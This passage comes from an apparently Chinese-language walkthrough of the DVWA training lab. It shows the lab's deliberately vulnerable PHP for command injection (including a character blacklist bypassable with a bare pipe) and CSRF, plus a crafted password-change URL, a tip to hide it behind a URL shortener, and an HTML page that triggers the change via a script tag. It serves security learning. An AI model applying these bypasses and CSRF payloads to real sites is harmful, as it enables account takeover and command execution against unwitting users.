    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token function">array_keys</span><span class="token punctuation">(</span> <span class="token variable">$substitutions</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$substitutions</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Determine OS and execute the ping command.</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// Windows</span>
        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// *nix</span>
        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  -c 4 '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Feedback for the end user</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cmd</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里上一个level最大的不同就在于，设置了黑名单并且过滤了&amp;&amp;与;分号，不过这并不影响我们，因为这里过滤并不全，我们依旧可以向上一关一样进行文件读取等命令执行</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111200443528.png" alt="image-20240111200443528"></p>
<h2 id="High-2">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// Set blacklist</span>
    <span class="token variable">$substitutions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token string single-quoted-string">'&amp;'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">';'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'| '</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'-'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'$'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'('</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">')'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'`'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'||'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// Remove any of the characters in the array (blacklist).</span>
    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token function">array_keys</span><span class="token punctuation">(</span> <span class="token variable">$substitutions</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$substitutions</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Determine OS and execute the ping command.</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// Windows</span>
        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// *nix</span>
        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  -c 4 '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Feedback for the end user</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cmd</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>trim</code>：trim — 去除字符串首尾处的空白字符（或者其他字符）</p>
<p>如上所示，这串代码先用trim去除了IP参数内容的空格等字符，随后用更加严格的黑名单进行了过滤。虽然看着很全，但仔细观察会发现，其对|的过滤实际上是这样的<code>| </code>附加了一个空格，这估计是模拟现实中开发人员的失误。这意味着我们使用|依旧可以命令执行</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111201008732.png" alt="image-20240111201008732"></p>
<h2 id="Impossible-2">Impossible</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Check Anti-CSRF token</span>
    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Get input</span>
    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除反斜杠\字符</span>

    <span class="token comment">// Split the IP into 4 octects</span>
    <span class="token variable">$octet</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将IP使用.符号分隔开</span>
    <span class="token comment">// Check IF each octet is an integer</span>
    <span class="token comment">//这里限制死了IP的每一段都需要为整数，且整个IP只能有四个网段</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">sizeof</span><span class="token punctuation">(</span> <span class="token variable">$octet</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// If all 4 octets are int's put the IP back together.</span>
        <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment">// Determine OS and execute the ping command.</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// Windows</span>
            <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// *nix</span>
            <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  -c 4 '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Feedback for the end user</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cmd</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// Ops. Let the user name theres a mistake</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如上所示，这里先是判断用户令牌，防止了CSRF攻击，接着去除了IP参数的反斜杠字符，然后将IP内容以点号分隔开，分别判断得到的数组每一位数组元素是否为整数，且整个数组长度只能为4，否则将被视为无效IP。</p>
<p>这种就是白名单过滤的方式了，只要不符合正确的IP格式，则抛出错误，这里我们是无法绕过的。</p>
<h1>0x03 CSRF</h1>
<h2 id="Low-3">Low</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Do the passwords match?</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// They do!</span>
        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Update the database</span>
        <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE `users` SET password = '<span class="token interpolation"><span class="token variable">$pass_new</span></span>' WHERE user = '"</span> <span class="token operator">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Feedback for the user</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// Issue with passwords matching</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里直接对用户输入的密码判断是否在两次输入中相等，如果相等，就直接更新密码，并没有对访问来源等做出限制</p>
<p>很明显这里并不能有效的阻止CSRF的存在，如果用户访问我们精心构造的恶意链接，就会造成CSRF，造成恶意代码执行。攻击思路如下：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&amp;user_token=6cfafc0462102ccd10970a2c8e8fa780#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果用户在当前网站访问上述链接，那就会执行密码修改的功能。倘若这时候我们知道了用户名，则我们可以成功冒充用户登录。当然如果对方有点防范意识的话，就不会点击上述很明显可疑的网址，那我们先搞一个简单的短网址来攻击。</p>
<p>在线工具：<a target="_blank" rel="noopener" href="https://tool.chinaz.com/tools/dwz.aspx">https://tool.chinaz.com/tools/dwz.aspx</a></p>
<p>生成如下：<a target="_blank" rel="noopener" href="http://i7q.cn/5UMMrV">http://i7q.cn/5UMMrV</a></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111203914143.png" alt="image-20240111203914143"></p>
<p>可以看到成功伪造</p>
<h3 id="配合XSS">配合XSS</h3>
<p>这种 XSS 和 CSRF 结合成功率很高，攻击更加隐蔽。首先新建一个带有 xss 攻击语句的 html 页面，内容如下：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>XSS&amp;CSRF<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&amp;user_token=6cfafc0462102ccd10970a2c8e8fa780#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当受害者访问含有这个html代码的页面的时候，用户的密码就被恶意修改了。</p>
<p>核心语句就是通过 <code>scirpt</code> 标签的 src 属性来记载攻击 payload 的 URL。当然还可以使用iframe、img等标签</p>
<h2 id="Medium-3">Medium</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Checks to see where the request came from</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// Get input</span>
        <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token comment">// Do the passwords match?</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// They do!</span>
            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// Update the database</span>
            <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE `users` SET password = '<span class="token interpolation"><span class="token variable">$pass_new</span></span>' WHERE user = '"</span> <span class="token operator">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// Feedback for the user</span>
